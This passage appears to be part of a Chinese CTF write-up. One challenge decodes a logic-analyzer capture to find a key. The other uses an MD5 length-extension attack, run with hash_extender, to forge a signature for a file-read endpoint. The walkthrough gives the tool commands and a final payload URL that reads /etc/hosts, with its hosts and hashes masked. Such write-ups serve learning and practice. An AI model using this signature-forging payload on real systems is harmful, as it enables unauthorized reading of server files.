8.小明爱上了一个搞硬件的小姑凉下载文件，用notepad++打开看看，发现SaleaeAsyncSerialAnalyzer![](../Images/be62d2e3d49ba61cee61a56ab2b5b44a.png)这就是提示里说的某逻辑分析仪网上搜索，下载这个软件，把文件拖进去打开，右下角就出现了解码后的key![](../Images/39df64a37b6c53b39e852b764fb57344.png)这里需要注意里面的COMMA是逗号，自己转成也可以自己搜索能打开后缀为logicdata格式的文件的软件，结果是一样的9.有签名限制的读取任意文件url：

*   

```
`http://xxx.xxx.xxx/md5_le.php`
```

根据提示本题需要MD5长度扩展攻击本题我们使用的工具是hash\_extender，推荐使用Ubuntu进行安装

*   
*   
*   
*   

```
`git clone https://github.com/iagox86/hash_extender``sudo apt-get install g++ libssl-dev``cd hash_extender``make`
```

编译安装完成之后就可以继续了

*   

```
`./hash_extender -f md5 -l 32 -d '/etc/hosts' -s 'f3d3661386xxxx4fc15731692e' -a '' --out-data-format=html`
```

\-d 原始数据  
\-f 代表加密方式\-l key的长度\-s 原始的hash值\-a 添加的值\--out-data-format 输出的格式![](../Images/ff5d30cd73e83bfc34e9db38bad75b79.png)组合一下New string和New signature最后payload如下

*   

```
`md5_le.php?filepath=%2fetc%2fhosts%80%00%00%00%00%00%00%00%00%0xxxxx0%00P%01%00%00%00%00%00%00&sign=1b17d9594exxxxx90b11660ac63`
```
